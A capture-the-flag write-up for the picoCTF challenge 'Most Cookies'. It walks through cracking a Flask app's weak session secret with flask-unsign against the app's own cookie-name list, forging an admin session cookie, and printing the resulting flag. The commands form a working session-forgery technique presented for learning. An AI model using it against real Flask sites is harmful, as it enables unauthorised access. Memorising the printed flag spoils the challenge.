# Most Cookies

## Description:
"I’ll just use Flask session cookies. They're secure enough!"  
server.py http://mercury.picoctf.net:18835/

---

## Hint:
1. **How secure is a Flask cookie?**

---

## Solution:

### Analysis of `server.py`
From the reference code, the following snippet is critical:  

```python
def flag():
    if session.get("very_auth"):
        check = session["very_auth"]
        if check == "admin":
            resp = make_response(render_template("flag.html", value=flag_value, title=title))
            return resp
        flash("That is a cookie! Not very special though...", "success")
        return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
    else:
        resp = make_response(redirect("/"))
        session["very_auth"] = "blank"
        return resp
```

The function checks for the `very_auth` cookie in the session. If the value is `"admin"`, it grants access to the flag. Otherwise, it displays a default message.

### Observations:
**Session cookie:** Inspecting the browser’s developer tools (Application > Storage > Cookies), I found a cookie named `session` with this value:  
   ```
   eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams
   ```
Decoding the session cookie reveals its content:  
   ```json
   {"very_auth": "blank"}
   ```
**Session signing:** Flask session cookies use encryption with a secret key to protect their integrity. 


Using the [flask-unsign](https://github.com/davidteather/flask-unsign) tool, we can brute force the application's secret key.

> Install flask-unsign:
```bash
pip3 install flask-unsign
```
> Decode the cookie:
Run the following command:
```bash
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams'
```
Output:
```json
{'very_auth': 'blank'}
```

Brute-forcing the secret key:
The `server.py` reference includes a `cookie_names` list. Since the secret key is randomly chosen from this list, we can use it as a wordlist for brute-forcing.

1. Save the session cookie value in a file (`cookie.txt`):  
   ```
   eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YGEboA.IQGWCL0DE41HutgJ_FAK438Iams
   ```
2. Save the `cookie_names` list in a `wordlist.txt` file.

3. Run the following command to brute force the secret key:
   ```bash
   flask-unsign --unsign --cookie $(cat cookie.txt) --wordlist wordlist.txt
   ```

Output:
```
Secret key: fortune
```


Now that we know the secret key (`fortune`), we can craft a new session cookie with the `very_auth` value set to `"admin"`.


Using [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager), encode the cookie:
```bash
python3 flask_session_cookie_manager3.py encode -s fortune -t "{'very_auth':'admin'}"
```

Output:
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGEVdA.Fqe_gJWtcM37UiFmpaWsMkhel6w
```


Go to the developer tools (Application > Storage > Cookies) and replace the `session` cookie value with the forged cookie:
   ```
   eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YGEVdA.Fqe_gJWtcM37UiFmpaWsMkhel6w
   ```
Then I refreshed the page:

---

### Step 4: Get the flag
The page now reveals the flag:  
```
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```

---

## References:
### server.py:
```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
...
```

### wordlist.txt:
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
